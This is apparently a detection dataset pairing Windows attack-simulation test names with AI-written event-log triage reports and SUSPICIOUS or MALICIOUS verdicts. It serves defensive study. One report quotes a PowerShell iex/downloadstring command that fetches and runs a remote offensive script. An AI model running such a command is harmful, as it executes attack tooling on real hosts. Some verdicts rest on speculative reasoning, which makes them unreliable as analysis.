Examine domain password policy - Windows,"After reviewing the provided Windows event logs, I conducted an analysis focusing on key indicators of malicious activity such as process execution patterns, command-line arguments, suspicious logins, or privilege escalations.

**Detailed Analysis:**

1. **Time Synchronization Events:**
   - Multiple events indicate a time change on the system. This includes both Kernel-General and Security-Auditing logs (EventID 4616), showing the system clock was set back by a few seconds around the same time. Time changes like these could potentially be used to disrupt log audits or correlate actions, but given the very short duration, it appears more benign. It's common for systems to synchronize time with services like time.windows.com.

2. **Security Logins and Privileges:**
   - The logs indicate a login (EventID 4624) using NTLMv2, which is an older authentication method, associated with the user ""admin_test."" This session also has elevated privileges (EventID 4672) including SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc., which are typical for administrative users.
   - However, no failed login attempts or unusual login times are evident.

3. **Sysmon Logs and Command Executions:**
   - Processes such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `net.exe` are being executed by the ""admin_test"" account. The `cmd.exe` invocation running ""net accounts /domain"" suggests enumeration of domain account policy information. This is a common administrative task but could also indicate lateral movement or information gathering in a more concerning context.
   - The execution of `whoami.exe` and `hostname.exe` is generally benign but might be used to gather context about the execution environment if done by malicious actors.
   
4. **Other Observations:**
   - Routine activities by system processes such as `svchost.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, and Windows services processes (`TiWorker.exe`, `TrustedInstaller.exe`) were noted, which are typical for a Windows operating environment to perform tasks like updates or maintenance.

**Assessment:**

- **Indicators of Anomalous but not Clearly Malicious Activity:**
  - The slight backward time shifts and the sequence of executed commands (`net accounts /domain`, `whoami.exe`) by the admin account `admin_test`.
  - Elevated privileges are observed during the sessions initiated by ""admin_test"", though this might be within the normal range for a user intended to perform administrative tasks.
  
**Resolution:**

- **SUSPICIOUS**
  - While no explicit malicious actions are detected from the logs, the combination of time change events, NTLMv2 logins, enumeration of account policies, and privilege assignments should be further investigated. This is because these activities, under different circumstances, could align with preparation for an extended attack phase like lateral movement or privilege escalation.
  
**Guidance on How to Proceed:**

- **Account Verification:**
  - Ensure the ""admin_test"" account is known and authorized for the activities noted.
  
- **Monitor and Correlate:**
  - Increase monitoring on this account for further actions that could suggest malicious intent, such as mass data transfers, attempts to disable security tools, or accessing sensitive files.
  
- **Time Change Validation:**
  - Validate the reason for time changes with potential automated time synchronization logs or policies.

- **Network Logs:**
  - Analyze network traffic in correlation with these logs to understand if any external connection corresponds with suspicious behaviors.

- **Review and Update:**
  - Review security configurations specifically around NTLM authentication and ensure that only secure and required services are running as privileged accounts.

Given the activities, extra vigilance and continuous monitoring combined with a thorough review of administrative practices are recommended."
Use of SecEdit.exe to export the local security policy (including the password policy),"Upon detailed review of the provided Sysmon event logs, we can identify several key points and behaviors that need to be addressed:

1. **Microsoft Edge Updates:**
   - The majority of the events relate to processes pertaining to Microsoft Edge Update. Events indicate executions of processes such as `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe`. These processes are executed under the `NT AUTHORITY\SYSTEM` account, which is expected for system updates and tasks. The presence of processes such as `MicrosoftEdgeUpdate.exe` aligns with legitimate update activities.
   - The command line arguments used (`/regserver`, `/svc`, `/ua`, `/c`, `/installsource core`) are typical for update operations and do not inherently suggest malicious behavior.

2. **Routine System Utilities Execution:**
   - Several events show execution of system tools like `whoami.exe`, `cmd.exe`, `conhost.exe`, and `SecEdit.exe` under a high integrity level by the `SERVER002\admin_test` user. Specifically, the use of `whoami.exe` and `SecEdit.exe` suggests the user is checking logged on user information and security policies, which can be standard activities for administrative purposes.
   - The use of `cmd.exe` to execute `secedit.exe` command to export security policy is not inherently suspicious, but it is an administrative action that should be scoped to ensure no unauthorized changes are being made.

3. **Multiple Instances of `wevtutil.exe`:**
   - The logs show multiple instances of `wevtutil.exe` being executed by `SERVER002\admin_test`, which is used to manage Windows event logs, such as exporting or clearing event logs. This could be suspicious if there is no legitimate need for repeatedly interacting with event logs in a short time frame.

4. **Temporary Directory Execution:**
   - An event shows a process executed from a temporary directory: `C:\\Program Files (x86)\\Microsoft\\Temp\\EU6392.tmp\\MicrosoftEdgeUpdate.exe`. Temporary directories are commonly used by installers or setup programs but can be exploited for malicious purposes. The context of permissions and the source of execution should be verified.

**Assessment:**
Overall, the activities in the logs mostly align with standard administrative and system update behavior. However, certain nuances, like repeated use of `wevtutil.exe` by a non-system account and the execution of processes from temporary directories, require caution and further investigation.

**Resolution:**
- **SUSPICIOUS**: Due to the repetitive interaction with event logs and the execution of processes from a temporary directory, which might be indicative of attempts to clear or manipulate logs, or execute unauthorized operations. These actions warrant further scrutiny. Verify the legitimacy and necessity of these actions with the involved user or by cross-referencing scheduled and authorized tasks.

**Guidance:**
- Review relevant user activities and intentions behind these commands and processes.
- Check system and application logs for correlating evidence of authorized tasks.
- If unauthorized actions are suspected, consider enhancing monitoring and conducting a deeper forensic analysis of the involved host and accounts."
System Discovery using SharpView,"The log entries provided for analysis appear to show potentially suspicious behavior. Here’s a detailed breakdown of the suspicious activities observed in these logs:

### Sysmon Logs:
1. **PowerShell Execution**: 
   - The logs show multiple executions of `PowerShell.exe` with a specific command line: `""powershell.exe"" & {$syntaxList = ...}` which includes calls to external scripts (`SharpView.exe`) with potentially malicious intent: `Invoke-ACLScanner`, `Invoke-Kerberoast`, and `Find-DomainShare`. These are known tools/techniques often used by attackers for reconnaissance and privilege escalation within a domain environment.
   
2. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
   - The frequent and close execution of `wevtutil.exe` and `conhost.exe` can be indicative of event log clearing or other log manipulation tactics typically associated with attack activity.

3. **Suspicious Process Hierarchy**:
   - The parent processes for some commands are `wsmprovhost.exe`, indicating possible remote commands or remote management sessions executed within high integrity levels. This could suggest lateral movement or unauthorized administrative actions.

### Application Logs:
- **Windows Defender State**: The logs show several entries indicating Windows Defender is on, which is expected for maintaining endpoint security. However, no malicious detections reported in this time frame suggests potential evasion or disablement activities during suspicious activities.

### Security Logs:
- **Privilege Assignments**:
  - Event 4672 entries show `SeDebugPrivilege`, among others, which could allow an attacker advanced capabilities for debugging and potentially loading malicious drivers.

### Windows PowerShell Logs:
- **Abnormal PowerShell Activity**:
  - The PowerShell script executed could be part of a larger attack technique. Tools being used (like SharpView) indicate enumeration and potential data gathering/movement operations on the network, commonly reflective of an ongoing attack.

### Assessment:
- The use of specific PowerShell command syntax and external scripts commonly associated with attack methodologies (reconnaissance and potential lateral movement) represents a significant security concern.
- Frequent and quick succession process executions (`wevtutil.exe` and `conhost.exe`) along with remote command execution tools (`wsmprovhost.exe`) being invoked in quick succession raise red flags about automatic or scripted attack processes.
- Privileges matching those that would facilitate unauthorized data access or concealment activities (loading drivers, taking ownership) suggest compromise escalation.

### Threats and Risks Identified:
- Potential network reconnaissance is being conducted using scripts like SharpView.
- Possible log manipulation aimed at hiding malicious activities.
- Likely unauthorized remote access with elevated privileges which could lead to data exfiltration or further compromise of this or adjacent systems.

### Guidance on How to Proceed:
- Immediately conduct a forensic investigation focusing on servers and endpoints for unusual software or script deployments.
- Use endpoint protection tools to review and block known indicators related to this PowerShell and SharpView activity.
- Verify account access logs, event logs, and credential usage during the log timestamps for suspicious activity.
- Consider network isolation if suspicious activities are occurring to prevent potential lateral movement.
- Review firewall and IDS logs for related network activity suggesting unauthorized access or data exfiltration.

### Resolution:
- **MALICIOUS** - The logs contain clear indicators of potentially malicious activity due to the specific usage of known attacker tools and techniques, signs of privilege abuse, and the potential for broader network attacks. Immediate action is warranted to contain and mitigate the identified threats."
Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"Upon reviewing the provided event logs, the following analysis was conducted to identify any suspicious or malicious behavior:

1. **Time Synchronization and Time Change Events**:
   - There are numerous events related to time changes and time synchronization (`EventID 24` and `EventID 1` in the System log). The time adjustments are very minor and typical for a system adjusting its clock and syncing with a time server. These appear to be routine and do not indicate malicious activity.

2. **Sysmon Events**:
   - Multiple processes are executed, primarily `svchost.exe`, `hostname.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `powershell.exe`.
   - The use of `powershell.exe`, particularly with command-line arguments invoking `Get-CimInstance` and `Get-WmiObject`, could be a part of legitimate administrative tasks. However, given their reputation for abuse in malicious scripts, these instances should be examined further for context.
   - Processes like `cmd.exe` executing a command string with PowerShell indicates potential misuse, but could also reflect legitimate system checks or administrative scripts.

3. **Windows PowerShell Events**:
   - PowerShell logs show commands being executed to query antivirus products. This could be part of administrative checks, but it is crucial to ensure these commands align with expected administrative activities. Excessive or unusually timed PowerShell usage might warrant a closer inspection.

4. **Security and Application Events**:
   - Security logs mainly show time adjustment activity. There is no evidence of privilege escalation or unusual logons.
   - Application logs reflect regular service start and stop events related to ""edgeupdate"", corresponding to Microsoft Edge updates, which are normal and do not exhibit indications of compromise.

5. **EdgeUpdate and Microsoft Edge Logs**:
   - Various processes related to Microsoft Edge updates are evident, with different modules executing and completing actions. These appear consistent with regular update mechanisms and show no signs of being compromised.

### Conclusion:

- **Suspicious Activity**:
  - The PowerShell commands logged do not immediately signify malicious activity, but they could suggest administrative actions that need verification.
  - Close monitoring of PowerShell usage and ensuring it aligns with typical administrative behavior is recommended.

- **Final Resolution**: **SUSPICIOUS**
  - Although no overtly malicious activity is conclusively found, due to the nature of the PowerShell command usage and the potential risk they pose, further investigation and monitoring of this system's PowerShell executions are suggested. It could also be beneficial to verify with the system administrators if these PowerShell commands were expected or part of regular maintenance scripts."
WinPwn - PowerSharpPack - Watson searching for missing windows patches,"### Detailed Analysis of Log Entries

#### Application Log
- The Application log primarily shows status changes for Windows Defender with a message indicating ""SECURITY_PRODUCT_STATE_ON"", which implies that Windows Defender is active. This is normal behavior and indicates that the system's antivirus is functioning.

#### Windows PowerShell Log
- A substantial red flag is identified in the PowerShell logs. A PowerShell script is executed using `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')`. This script attempts to download and execute a script from the internet.
- Loading and executing remote code in this manner is highly suspicious and a common tactic used in malware attacks. The invoked script `Invoke-SharpWatson.ps1` may potentially contain malicious payloads, and its intention should be confirmed.

#### Sysmon Log
- The `Sysmon` log mostly records regular occurrences, such as the execution of various system processes like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and `hostname.exe`. 
- There is the presence of `powershell.exe` with similar command-line arguments observed in the PowerShell logs, further confirming that a potentially harmful script was downloaded and executed.
  
#### Security Log
- The security logs show a standard log with event ID `4616`, which indicates that the system time was changed. This might be benign but could also be a tactic used to disrupt time-based security events or logs. However, based on the information provided, this activity alone does not directly indicate malicious behavior.

#### System Log
- System logs indicate the regular functioning of services like the time update (`time.windows.com`). There is nothing inherently suspicious in this log by itself.

### Assessment and Resolution
Based on the analysis, the activity identified in the PowerShell log is a strong indicator of potential malicious activity due to the execution of a script downloaded from an external source. This is often associated with Remote Code Execution (RCE) attacks and unauthorized data retrieval or manipulation.

### Resolution
- **MALICIOUS**: The PowerShell script execution stands out as a clear indicator of compromise. The activity should be treated as potentially malicious and requires immediate attention.

### Guidance
1. **Immediate Action**:
   - Disconnect the affected system (Server002) from the network to prevent further spread or data exfiltration.
   - Block the URL used in the PowerShell script on the network to prevent further access or execution.

2. **Threat Investigation**:
   - Analyze the downloaded script and determine its purpose and impact.
   - Check for any unauthorized changes, data breaches, or persistence mechanisms installed by the script.

3. **Remediation**:
   - Consider restoring the system to a previous clean state using backups.
   - Review and enhance security policies, especially execution policies for PowerShell scripts, to prevent such incidents in the future.

4. **Monitoring**:
   - Increase logging and monitoring on PowerShell and network traffic to detect any similar patterns.
   - Ensure all endpoint protections like antivirus and firewall are up-to-date and robust."
Process Discovery - PC Hunter,"Upon analyzing the provided logs, several points of interest and potential indicators of suspicious activity can be noted:

### Security Log:
1. **Event ID 4672 and 4624:**
    - There are two sets of critical privilege assignments (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.) and successful logons by the `admin_test` user. The privileges assigned to this account are extensive and include potentially dangerous ones like `SeDebugPrivilege`.
    - The logon type is `3`, which is a network logon, typically used for accessing network shares. It is not inherently suspicious but combined with the PowerShell execution, it requires attention.
    - IP addresses `fe80::e3b5:5371:12a8:9c77` and `fe80::866a:d1f8:8d06:7bc` denote local link addresses, suggesting local network activity.

2. **Event ID 4634:**
    - Logoff events for `admin_test` shortly after logon, which could mean that the sessions ended quickly.

### Windows PowerShell Log:
- **PowerShell Usage:**
  - `Start-Process` command used to run `PCHunter64.exe` from `C:\Temp\Externalfiles\`, which seems atypical for a PowerShell operation. PC Hunter is a known diagnostic tool but can be potentially misused for malicious activities like system inspection and manipulation.
  
### Sysmon Log:
1. **Process Creation:**
   - PowerShell processes (`powershell.exe`) starting `PCHunter64.exe` is recorded. This aligns with the potential misuse of PowerShell to execute diagnostic or potentially harmful software without typical administrative oversight.
   - Large number of `wevtutil.exe` executions, which is a Windows utility for managing event logs, could suggest log tampering or auditing trail removal.
   - `whoami.exe` and `hostname.exe` execution indicate information gathering which could be automated or part of a script for reconnaissance.

### System and Application Logs:
- **No direct indicators of compromise noted here, although the presence of CA-related events (`CAPI2`) indicates normal cryptographic functions.**

### Conclusion and Assessment:

Based on the analysis:
- **Suspicious:** The combination of extensive privilege grants, particularly `SeDebugPrivilege`, and the PowerShell execution of `PCHunter64.exe` without clear administrative context raises red flags. The network logon quickly followed by logoff, alongside use of diagnostic tools, implies potential unauthorized reconnaissance or system auditing activities.
  
### Guidance on How to Proceed:
1. **Further Investigation:** 
   - Check the legitimacy and purpose of `PCHunter64.exe` on the system. Confirm if this is a sanctioned tool used by IT, and check its integrity and context of usage.
   - Review the security configurations and access logs for `admin_test` to ensure the account has not been compromised.
   - Investigate any other systems with similar patterns or linked to the same logon session identified by network activity.
2. **Security Measures:**
   - If not already in place, enhance monitoring on PowerShell activity and privilege escalation events.
   - Ensure system and network alerts are configured to notify on unusual activities such as the execution of powerful diagnostic tools.

### Final Resolution:
- **SUSPICIOUS** - The logs indicate activities that require further investigation to rule out malicious intent, given the use of diagnostic tools and extensive privileges that could be leveraged improperly."
Discover System Language with chcp,"Upon thorough analysis of the provided Windows event logs, several patterns and specific activities stood out as noteworthy:

1. **Frequent Execution of Event Related Commands:**
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` in quick succession. While these are legitimate Windows binaries, their repetitive execution might be suspicious if not part of scheduled tasks or maintenance actions. `wevtutil.exe` is often used to manage event logs which could imply tampering with log files.

2. **Administrative Actions:**
   - The processes are being executed by the user account ""SERVER002\admin_test"". This account seems to have a high level of privileges as indicated by Security log Event ID 4672, documenting the assignment of significant privileges such as SeDebugPrivilege, SeTakeOwnershipPrivilege, etc. This could indicate potential privilege escalation to execute sensitive operations or access restricted areas of the system.
   
3. **Time Synchronization Events:**
   - Event ID 4616 from the Security log indicates a change in system time, which can be used to cover malicious traces or obscure activities done at specific times.

4. **Execution of System Commands:**
   - The logs also detail the execution of commands such as `hostname.exe`, `whoami.exe`, and `cmd.exe /c chcp`. While these are legitimate Windows commands, their execution in particular patterns or in a sytematically close timeframe without legitimate cause can be indicators of reconnaissance or environment fingerprinting by an attacker.

5. **Network Activity:**
   - There are logon events documented from an IP address (192.168.0.102) via NTLM which is typical in a network context. However, this should be checked for legitimacy as NTLM over network can sometimes imply potential lateral movement attempts.

**Assessment & Recommendation:**
- **Resolution: SUSPICIOUS**
   - The repetitive and patterned usage of `wevtutil.exe` and other command-line tools without clear legitimate purposes, alongside time changes and administrative privilege activities, elevate the logs to a suspicious category.
   - Further investigation is warranted to identify the intention behind these activities. 

**Next Steps:**
1. Investigate the legitimacy of the ""SERVER002\admin_test"" account and the purpose of its elevated privileges.
2. Cross-check the observed IP addresses and determine if they belong to expected network locations.
3. Conduct a full scan for scheduled tasks or scripts possibly utilizing `wevtutil.exe` or `cmd.exe`.
4. Engage in network traffic analysis to detect any possible lateral movement or exfiltration attempts linked to the provided IP addresses and user accounts.
5. If feasible, revert to previous snapshots or backups for forensic analysis without affecting current system operations. 

Maintaining vigilance in monitoring future logs and activity around this timeframe or pattern can also provide further insights or warnings of potential malicious threats."
Process Discovery - wmic process,"Upon reviewing the provided Windows event logs, here are the key observations and analysis:

1. **Time Manipulation (Event ID 4616 in Security log and related in System log):** 
   - The logs indicate changes in system time. A time set event is recorded, where the new system time is set to an earlier point than the old time.
   - Events with ID 4616 and Kernel-General Event ID 1 confirm this time change, which shows involvement of svchost.exe.
   - Such changes can be employed by attackers to alter event timelines and mask their activities; however, time synchronization issues may also result in similar log entries.

2. **Use of Administrative Tools (Sysmon Events with Image ""wevtutil.exe""):**
   - Multiple instances of `wevtutil.exe` used by `SERVER002\admin_test` appear in Sysmon logs. Wevtutil.exe is a legitimate Windows tool used for managing Windows Event Logs.
   - While legitimate, frequent or unusual usage could suggest malicious attempts to clear or export event logs to remove traces.

3. **Command Execution and System Reconnaissance Commands (Sysmon Event ID 1):**
   - Execution of `whoami.exe`, `cmd.exe`, `WMIC.exe`, and `hostname.exe` by the same user indicates actions possibly related to system reconnaissance.
   - The use of `wmic process get /format:list` suggests information gathering on system processes, which could be benign or part of a reconnaissance phase in an attack.

4. **Normal Scheduled and System Operations:**
   - Some events, such as those involving Microsoft Edge Update and typical svchost.exe operations with SYSTEM and NETWORK SERVICE, are consistent with regular scheduled system activities.

**Assessment:**
- **SUSPICIOUS:** The events related to time alteration and the frequent execution of administrative command-line tools by a user account are indicatively suspicious. These actions do not conclusively demonstrate malicious activity but are unusual enough to warrant further investigation.

**Guidance:**
- Verify if the time changes were authorized and investigate the source of system commands issued by the `admin_test` user account.
- Check user activity logs and system policy changes around these timestamps for further context.
- Ensure robust monitoring and alerting is in place for any unauthorized or unexpected tool usage or time changes in the future.
- Execute a follow-up investigation to confirm the intent behind these logs and uncover any potential malicious activity that might require remediation."
